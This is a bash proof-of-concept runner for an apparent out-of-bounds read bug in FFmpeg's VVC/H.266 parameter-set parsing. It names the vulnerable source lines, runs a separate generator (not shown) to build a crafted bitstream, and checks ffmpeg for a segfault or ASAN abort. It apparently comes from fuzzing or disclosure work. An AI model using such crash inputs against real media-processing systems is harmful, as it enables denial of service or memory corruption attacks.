#!/bin/bash
# PoC runner for VULN 001: VPS vps_num_ptls_minus1 OOB
# File: libavcodec/cbs_h266_syntax_template.c lines 788-803, 933-938

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
INPUT="$SCRIPT_DIR/vuln_001.266"

echo "=== VULN 001 PoC Runner ==="
echo "Target: $FFMPEG"
echo "Input:  $INPUT"
echo ""

# Step 1: Generate the crafted VVC bitstream
echo "[*] Generating crafted VVC bitstream..."
python3 "$SCRIPT_DIR/vuln_001_gen.py" "$INPUT"
echo ""

# Verify the file was created
if [ ! -f "$INPUT" ]; then
    echo "[-] ERROR: Failed to generate input file"
    exit 1
fi

echo "[*] Running ffmpeg on crafted VVC file..."
echo "[*] Command: $FFMPEG -i $INPUT -f null -"
echo ""

# Run ffmpeg with timeout, capture all output
set +e
timeout 30 "$FFMPEG" \
    -i "$INPUT" \
    -f null - \
    2>&1
FFMPEG_EXIT=$?
set -e

echo ""
echo "=== ffmpeg exit code: $FFMPEG_EXIT ==="

# Also try with explicit VVC demuxer
echo ""
echo "[*] Trying with explicit raw VVC demuxer..."
set +e
timeout 30 "$FFMPEG" \
    -f h266 \
    -i "$INPUT" \
    -f null - \
    2>&1
FFMPEG_EXIT2=$?
set -e

echo ""
echo "=== ffmpeg (h266 demuxer) exit code: $FFMPEG_EXIT2 ==="

# Determine overall exit code
if [ $FFMPEG_EXIT -eq 139 ] || [ $FFMPEG_EXIT2 -eq 139 ]; then
    echo ""
    echo "=== CRASH DETECTED (segfault) ==="
    exit 139
elif [ $FFMPEG_EXIT -ne 0 ] || [ $FFMPEG_EXIT2 -ne 0 ]; then
    echo ""
    echo "=== Non-zero exit (possible error or ASAN abort) ==="
fi

exit 0
